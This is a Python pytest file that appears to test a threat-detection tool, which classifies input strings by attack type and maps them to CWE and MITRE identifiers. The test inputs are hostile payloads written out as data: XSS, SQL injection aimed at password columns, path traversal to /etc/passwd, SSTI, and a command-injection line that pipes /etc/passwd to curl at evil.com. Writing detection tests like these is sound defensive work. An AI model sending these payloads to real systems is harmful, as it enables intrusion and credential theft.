"""Tests for Multi-Vector Threat Analyzer."""

import pytest
from payload_entropy_studio.threat_analyzer import ThreatAnalyzer, ThreatSeverity


def test_xss_detection(threat_analyzer):
    rep = threat_analyzer.analyze("<script>alert(document.cookie)</script>")
    assert rep.primary_threat == "XSS"
    assert rep.risk_score >= 25
    assert "CWE-79" in rep.cwe_mappings
    assert "T1059.007" in rep.mitre_attack_mappings


def test_sqli_detection(threat_analyzer):
    rep = threat_analyzer.analyze("1' UNION SELECT 1,username,password FROM users WHERE '1'='1'--")
    assert rep.primary_threat == "SQL_INJECTION"
    assert rep.risk_score >= 40
    assert "CWE-89" in rep.cwe_mappings


def test_command_injection_detection(threat_analyzer):
    rep = threat_analyzer.analyze("; cat /etc/passwd | curl https://evil.com")
    assert rep.primary_threat in ("COMMAND_INJECTION", "PATH_TRAVERSAL_LFI")
    assert rep.risk_score >= 35


def test_lfi_path_traversal(threat_analyzer):
    rep = threat_analyzer.analyze("%252e%252e%252f%252e%252e%252fetc%2fpasswd")
    assert rep.primary_threat == "PATH_TRAVERSAL_LFI"
    assert "CWE-22" in rep.cwe_mappings


def test_ssti_detection(threat_analyzer):
    rep = threat_analyzer.analyze("{{7*7}}")
    assert rep.primary_threat == "SSTI"
    assert "CWE-1336" in rep.cwe_mappings


def test_benign_payload(threat_analyzer):
    rep = threat_analyzer.analyze("Hello, this is a normal search query about dogs.")
    assert rep.severity == ThreatSeverity.INFO
    assert rep.risk_score == 0
